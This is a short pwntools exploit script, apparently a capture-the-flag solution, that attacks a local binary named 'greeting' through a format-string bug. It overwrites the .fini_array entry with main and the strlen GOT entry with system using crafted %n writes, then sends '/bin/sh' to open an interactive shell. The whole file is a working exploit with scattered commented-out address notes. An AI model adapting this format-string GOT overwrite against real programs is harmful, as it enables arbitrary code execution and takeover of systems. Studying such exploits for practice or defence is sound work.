from pwn import *
# "b * printf"
#target = gdb.debug("./greeting", "b * (system)") 
target=process("./greeting")

strlen = 0x08049a54
#pop_ebx= 0x08048425 
main =   0x080485ed
system = 0x08048779 #  or 0804a014 or 0x08049a48 or 
getnline =0x08048614 
# 0x08048614 or 0x0804861c
eip = 0xffffcb2c
fini = 0x08049934
#30 or 
# eip @ 43
payload =  b"xx"
payload += p32(fini)
payload += p32(fini +2)
payload += p32(strlen)
payload += p32(strlen+2)
payload += b"%34288x%12$n" # 0xed
payload += b"%33264x%13$n" # 0x185
payload += b"%15$n"
payload += b"%31884x%14$hn"

print(len(payload))


target.sendline(payload)



target.sendline(b"/bin/sh")
target.interactive()